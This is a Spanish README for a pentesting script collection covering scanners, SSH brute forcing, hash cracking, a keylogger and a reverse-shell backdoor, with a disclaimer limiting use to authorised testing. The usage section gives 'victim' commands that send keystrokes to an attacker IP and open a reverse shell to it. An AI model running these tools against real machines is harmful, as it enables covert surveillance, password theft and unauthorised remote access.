# PenTools 🛡️

**PenTools** es una colección de scripts en Python diseñados para profesionales de la ciberseguridad, pentesters y entusiastas. Estas herramientas cubren varias fases de una prueba de penetración, desde el reconocimiento hasta la explotación.

> ⚠️ **AVISO LEGAL**: Este repositorio es para **FINES EDUCATIVOS** y **PRUEBAS AUTORIZADAS ÚNICAMENTE**. El autor no es responsable de ningún mal uso de estas herramientas. No utilices estas herramientas en ningún sistema sin permiso explícito.

## 📦 Herramientas Incluidas

| Herramienta | Descripción |
|------|-------------|
| **Network Scanner** | Escanea la red local buscando dispositivos activos usando peticiones ARP. |
| **Port Scanner** | Escanea puertos específicos o rangos en una IP objetivo para encontrar servicios abiertos. |
| **Subdomain Enumeration** | Herramienta multi-hilo para descubrir subdominios usando una wordlist. |
| **Directory Enumeration** | Fuerza bruta de directorios en un servidor web para encontrar rutas ocultas. |
| **SSH Brute Force** | Cracker de contraseñas SSH multi-hilo. |
| **Hash Cracker** | Herramienta simple para romper hashes usando un ataque de diccionario. |
| **KeyLogger** | Captura pulsaciones de teclas y las guarda en un archivo (requiere privilegios de Admin). |
| **JS Crawler** | Descarga todos los archivos JavaScript de una URL objetivo. |
| **Reverse Shell** | Herramienta de acceso remoto (Backdoor) con arquitectura cliente-servidor. |

## 🚀 Instalación

1. Clona el repositorio:
   ```bash
   git clone https://github.com/tuusuario/PenTools.git
   cd PenTools
   ```

2. Crea un entorno virtual (Recomendado):
   ```bash
   # Windows
   python -m venv .venv
   .venv\Scripts\activate

   # Linux/Mac
   python3 -m venv .venv
   source .venv/bin/activate
   ```

3. Instala las dependencias:
   ```bash
   pip install -r requirements.txt
   ```
   *(Nota: Puedes necesitar crear un archivo requirements.txt con: `requests`, `scapy`, `paramiko`, `keyboard`, `pyfiglet`)*

## 🛠️ Uso

### Subdomain Enumeration
```bash
python web/subdomain_enumeration.py <IP> -w resources/wordlists/subdomains.txt
```

### SSH Brute Force
```bash
python network/ssh_bruteforce.py <IP> <USUARIO> <DICCIONARIO> -t 10
```

### Directory Enumeration
```bash
python web/directory_enumeration.py <IP> -w resources/wordlists/directories.txt
```

### KeyLogger
**Servidor (Atacante):**
```bash
python spyware/keylogger_server.py -p 8080
```

**Cliente (Víctima):**
```bash
python spyware/keylogger.py --ip <IP_ATACANTE> --port 8080
```
*(Requiere privilegios de Administrador/Root para capturar teclas)*

### JS Crawler
```bash
python web/js_crawler.py http://ejemplo.com -o scripts_encontrados
```

### Hash Cracker
```bash
python crypto/hash_cracker.py <HASH> -w resources/wordlists/passwords.txt -m md5
```

### File Downloader
```bash
python web/file_downloader.py <URL> -o nombre_archivo.ext
```

### Reverse Shell (Backdoor)
**Servidor (Atacante):**
```bash
python backdoors/listener.py -p 4444
```

**Cliente (Víctima):**
```bash
python backdoors/reverse_shell.py --ip <IP_ATACANTE> --port 4444
```

## 🤝 Contribuir
Las pull requests son bienvenidas. Para cambios mayores, por favor abre primero un issue para discutir qué te gustaría cambiar.

## 📝 Licencia
Este proyecto está bajo la Licencia MIT - mira el archivo [LICENSE](LICENSE) para más detalles.
